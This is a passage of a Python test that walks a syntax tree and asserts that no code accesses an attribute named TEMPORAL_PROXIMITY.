        if isinstance(node, ast.Attribute) and node.attr == "TEMPORAL_PROXIMITY":
            offending.append("Attribute(.TEMPORAL_PROXIMITY)")
    assert not offending
